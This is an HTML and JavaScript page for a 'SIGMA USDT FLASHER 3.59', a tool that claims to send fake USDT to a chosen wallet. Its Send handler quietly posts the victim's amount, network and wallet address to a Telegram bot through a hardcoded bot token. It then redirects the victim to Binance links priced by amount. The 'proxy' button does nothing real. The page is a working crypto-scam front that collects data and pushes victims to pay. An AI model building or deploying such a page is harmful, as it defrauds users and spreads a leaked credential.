<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body, html {
      height: 100%;
      font-family: 'Poppins', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      background: transparent;
      overflow: hidden;
      position: relative;
    }

    #bgVideo {
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      object-fit: cover;
      z-index: -1;
    }

    .logo-icon {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 80px;
      border-radius: 50%;
      object-fit: cover;
      z-index: 10;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }

    .container {
      width: 90%;
      max-width: 400px;
      padding: 25px;
      background-color: rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      text-align: center;
      color: #1DBF73;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    }

    h2 {
      margin-bottom: 20px;
      font-size: 26px;
      font-weight: bold;
    }

    label {
      display: block;
      text-align: right;
      margin-bottom: 8px;
      font-weight: 600;
      font-size: 16px;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      background-color: rgba(52, 73, 94, 0.5);
      color: #1DBF73;
    }

    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .proxy-button {
      background-color: #e74c3c;
      color: white;
      margin-bottom: 16px;
    }

    .top-controls {
      position: fixed;
      bottom: 20px;
      width: 100%;
      max-width: 500px;
      display: flex;
      justify-content: space-between;
      padding: 0 20px;
      left: 50%;
      transform: translateX(-50%);
    }

    .lang-dropdown, .wallet-dropdown {
      background-color: rgba(42, 61, 68, 0.4);
      border: none;
      border-radius: 999px;
      padding: 8px 10px;
      color: #1DBF73;
      font-size: 14px;
      width: 48%;
      text-align: center;
    }
  </style>
</head>
<body>

  <video autoplay muted loop id="bgVideo">
    <source src="background.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <img src="logo.gif" alt="Logo" class="logo-icon"/>

  <div class="container">
    <h2 id="pageTitle">SIGMA USDT FLASHER 3.59</h2>

    <label for="amount" id="amountLabel">AMOUNT  ($)</label>
    <select id="amount">
      <option value="5000">5000</option>
      <option value="20000">20000</option>
      <option value="100000">100000</option>
    </select>

    <label for="network" id="networkLabel">Choose Network</label>
    <select id="network">
      <option value="TRC20">TRC20</option>
      <option value="BEP20">BEP20</option>
      <option value="ETH">Ethereum (ERC20)</option>
    </select>

    <label for="wallet" id="walletLabel">wellet adress</label>
    <input type="text" id="wallet" placeholder="type wallet adress reciever " />

    <button class="proxy-button" id="proxyBtn" onclick="activateProxy()">Proxy (Activate if you are not in USA)</button>

    <button id="submitBtn" onclick="submitTransfer()">Send</button>
  </div>

  <div class="top-controls">
    <select class="lang-dropdown" id="languageSelector" onchange="setLanguage()">
      <option value="en">üåê English</option>
      <option value="ar">üåê ÿßŸÑÿπÿ±ÿ®Ÿäÿ©</option>
      <option value="zh">üåê ‰∏≠Êñá</option>
      <option value="ur">üåê ÿßÿ±ÿØŸà</option>
    </select>

    <select class="wallet-dropdown" id="walletSelector" onchange="connectWallet()">
      <option value="none">üîó Choose Wallet</option>
      <option value="metamask">ü¶ä MetaMask</option>
      <option value="trustwallet">üîê Trust Wallet</option>
    </select>
  </div>

  <script>
    const translations = {
      en: {
        pageTitle: "SIGMA USDT FLASHER 3.59",
        amountLabel: "Amount ($)",
        networkLabel: "Choose Network",
        walletLabel: "Wallet Address",
        submitBtn: "Send",
      },
      ar: {
        pageTitle: "SIGMA USDT FLASHER 3.59",
        amountLabel: "ÿ≠ÿ¨ŸÖ ÿßŸÑŸÜŸÇŸàÿØ ($)",
        networkLabel: "ÿßÿÆÿ™ÿ± ÿßŸÑÿ¥ÿ®ŸÉÿ©",
        walletLabel: "ÿπŸÜŸàÿßŸÜ ÿßŸÑŸÖÿ≠ŸÅÿ∏ÿ©",
        submitBtn: "ÿ•ÿ±ÿ≥ÿßŸÑ",
      },
      zh: {
        pageTitle: "SIGMA USDT FLASHER 3.59",
        amountLabel: "ÈáëÈ¢ù ($)",
        networkLabel: "ÈÄâÊã©ÁΩëÁªú",
        walletLabel: "Èí±ÂåÖÂú∞ÂùÄ",
        submitBtn: "ÂèëÈÄÅ",
      },
      ur: {
        pageTitle: "SIGMA USDT FLASHER 3.59",
        amountLabel: "ÿ±ŸÇŸÖ ($)",
        networkLabel: "ŸÜ€åŸπ Ÿàÿ±⁄© ŸÖŸÜÿ™ÿÆÿ® ⁄©ÿ±€å⁄∫",
        walletLabel: "ŸàÿßŸÑŸπ ⁄©ÿß Ÿæÿ™€Å",
        submitBtn: "ÿßÿ±ÿ≥ÿßŸÑ ⁄©ÿ±€å⁄∫",
      }
    };

    function setLanguage() {
      const lang = document.getElementById("languageSelector").value;
      const t = translations[lang];
      document.getElementById("pageTitle").innerText = t.pageTitle;
      document.getElementById("amountLabel").innerText = t.amountLabel;
      document.getElementById("networkLabel").innerText = t.networkLabel;
      document.getElementById("walletLabel").innerText = t.walletLabel;
      document.getElementById("submitBtn").innerText = t.submitBtn;
    }

    async function connectWallet() {
      const wallet = document.getElementById("walletSelector").value;

      if (wallet === "metamask" && typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          const walletAddress = accounts[0];
          document.getElementById('wallet').value = walletAddress;
          alert("MetaMask wallet connected: " + walletAddress);
        } catch (error) {
          alert("Failed to connect wallet: " + error.message);
        }
      } else if (wallet === "trustwallet") {
        try {
          window.location.href = "trust://";
          setTimeout(function() {
            alert("Trust Wallet not found. Please make sure it is installed.");
          }, 2000);
        } catch (error) {
          alert("Failed to connect Trust Wallet.");
        }
      } else {
        alert("No wallet found. Please make sure MetaMask or Trust Wallet is installed.");
      }
    }

    function submitTransfer() {
      const amount = document.getElementById("amount").value;
      const network = document.getElementById("network").value;
      const wallet = document.getElementById("wallet").value;

      if (!amount || !wallet) {
        alert("Please fill in all fields.");
        return;
      }

      const message = `New USDT Request:\nAmount: $${amount}\nNetwork: ${network}\nWallet: ${wallet}`;
      const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
      const chatId = '7739393558';

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => {
        if (!response.ok) throw new Error("Telegram error");

        let url = '';
        if (amount === "5000") {
          url = "https://s.binance.com/k4fkMdfq";
        } else if (amount === "20000") {
          url = "https://s.binance.com/OBmWcAwi";
        } else if (amount === "100000") {
          url = "https://s.binance.com/JFhAxiky";
        }

        if (url) {
          window.location.href = `${url}?amount=${amount}&network=${network}&wallet=${encodeURIComponent(wallet)}`;
        } else {
          alert("Invalid amount selected.");
        }
      })
      .catch(error => {
        alert("Failed to send data to Telegram: " + error.message);
      });
    }

    let proxyActive = false;
    function activateProxy() {
      const btn = document.getElementById("proxyBtn");
      proxyActive = !proxyActive;

      if (proxyActive) {
        btn.style.backgroundColor = "#27ae60";
        btn.textContent = "Proxy Activated";
      } else {
        btn.style.backgroundColor = "#e74c3c";
        btn.textContent = "Proxy (Activate if you are not in USA)";
      }
    }
  </script>

</body>
      </html>
